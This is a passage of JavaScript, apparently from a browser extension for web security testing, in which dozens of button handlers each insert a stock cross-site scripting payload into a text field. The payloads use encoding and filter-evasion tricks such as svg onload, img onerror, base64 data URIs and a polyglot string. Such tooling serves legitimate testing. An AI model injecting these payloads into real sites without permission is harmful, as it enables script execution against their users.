 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});



	$('#xlfiptn').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '/title><menu id=x contextmenu=x onshow=alert(1)>right click me!';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});



	$('#xlfipelv').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '</textarea><br>"><h1/onclick=prompt(document.domain)>//INJECT</div>';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});



	$('#xlfiptwl').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '<math><brute href=javascript:alert(/133720/)>click';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});



	$('#xlfiptrn').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '<svg%0Aonload=%09((pro\u006dpt))()//';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});



	$('#xlfipfrn').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += 'llllll/"><br>"><img/src=x><ScRiPt>onclick=javascript:alert(1)/></br>';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});



	$('#xlfipfrr').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '"><svg%2fonload%3D%26%2397%3B%26%23108%3B%26%23101%3B%26%23114%3B%26%23116%3B%26%2340%3B%26%23100%3B%26%23111%3B%26%2399%3B%26%23117%3B%26%23109%3B%26%23101%3B%26%23110%3B%26%23116%3B%26%2346%3B%26%23100%3B%26%23111%3B%26%23109%3B%26%2397%3B%26%23105%3B%26%23110%3B%26%2341%3B>';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});



	$('#xlfipsxn').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '<table><thead%0Cstyle=font-size:700px%0Donmouseover%0A=%0Bconfirm(1)%09><td>AAAAAAAAA';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});



	$('#xlfipsvnt').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += 'data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});



	$('#xlfipetn').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '<a href="data:text&sol;html,&lt;script&gt;alert(1)&lt/script&gt">Click<test>';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});



	$('#xlfipnnt').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '<!--<img src="--><img src=x onerror=alert(1)//"> <![><img src="]><img src=x onerror=alert(1)//"> <svg><![CDATA[><image xlink:href="]]><img src=xx:x onerror=alert(2)//"></svg> <embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></embed> <object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object> <embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></embed> <b <script>alert(1)//</script>0</script> [A] <? foo="><script>alert(1)</script>"> <! foo="><script>alert(1)</script>"> </ foo="><script>alert(1)</script>"> [B] <? foo="><x foo="?><script>alert(1)</script>">"> [C] <! foo="[[[x]]"><x foo="]foo><script>alert(1)</script>"> [D] <% foo><x foo="%><script>alert(1)</script>">';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});



	$('#xlfiptwn').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '<embed src="javascript:alert(1)">';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});



	$('#xlfiptwo').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '<script ^__^>alert(String.fromCharCode(49))</script ^__^>';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});



	$('#xlfipttw').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});



	$('#xlfiptwnt').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '<iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});



	$('#xlfiptwnf').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '<script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script>';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});



	$('#xlfiptwnfv').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += 'data:text/html;charset=utf-7;base64,Ij48L3RpdGxlPjxzY3JpcHQ+YWxlcnQoMTMzNyk8L3NjcmlwdD4=';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});



	$('#xlfiptwnsx').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += "jaVasCript:/*-/*`/*`/*'/*'/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e";
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});



	$('#xlfiptwsv').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '<table><thead%0Cstyle=font-size:700px%0Donmouseover%0A=%0Bconfirm(1)%09><td>AAAAAAAAA';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});



	$('#xlfiptwght').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += "'/></a></><img src=foo.gif onerror=alert(1)>";
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});



	$('#xlfiptwnn').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += "'>><marquee><h1>XSS</h1></marquee>";
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});



	$('#xlfipttr').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += "//'-confirm(/133720/)-'";
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});



	$('#xlfipfrt').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += "//'-onmouseover=alert(/133720/)-'//";
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});



	$('#xlfipfrttw').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '<script>var var = 1; alert(var)</script>';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});



	$('#xlfipfrtth').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += "<STYLE type='text/css'>BODY{background:url('javascript:alert('XSS')')}</STYLE>";
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});



	$('#xlfipfrtfr').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += "<?='<SCRIPT>alert('XSS')</SCRIPT>'?>";
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});



	$('#xlfipfrtfv').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += "<IMG SRC='vbscript:msgbox('XSS')'>";
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});



	$('#xlfipfrtsx').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += "' onfocus=alert(document.domain) '> <'";
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});



	$('#xlfipfrtsvn').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '<FRAMESET><FRAME SRC="javascript:alert("XSS");"></FRAMESET>';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});



	$('#xlfipfrtght').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '<STYLE>li {list-style-image: url("javascript:alert("XSS")");}</STYLE><UL><LI>XSS';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});



	$('#xlfipfrtnn').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '[color=red width=expression(alert(123))][color]';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});



	$('#xlfipfff').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += "<BASE HREF='javascript:alert('XSS');//'>";
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});



	$('#xlfipfffo').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '<br size="&{alert("XSS")}">';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});



	$('#xlfipffft').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '<scrscriptipt>alert(1)</scrscriptipt>';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});



	$('#xlfipfffth').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
